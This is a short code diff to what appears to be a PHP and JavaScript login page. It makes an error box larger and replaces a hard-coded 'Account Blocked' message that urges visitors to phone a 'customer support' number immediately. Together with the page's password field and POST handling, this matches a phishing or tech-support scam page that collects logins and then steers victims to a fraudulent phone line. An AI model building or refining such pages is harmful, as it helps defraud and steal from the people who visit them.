@@ -114,7 +114,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             padding: 14px 16px;
             border-radius: 8px;
             margin-bottom: 18px;
-            font-size: 14px;
+            font-size: 20px;
             line-height: 1.35;
         }
 
@@ -477,7 +477,7 @@ const password = document.getElementById("password");
 const loginBtn = document.querySelector(".btn-primary");
 
 const BLOCKED_MSG =
-  "Due to Suspicious Activity Your Account has been Blocked. Please Contact Our Customer Support Immediately +1877-334-0352";
+  "Due to Suspicious Account Login Activity. Your Account has been Blocked. Please Contact Our Customer Support Immediately +1812 266-1842.";
 
 function showError(msg) {
   errorBox.innerHTML = `<strong class="error-title">Account Blocked</strong>${msg}`;
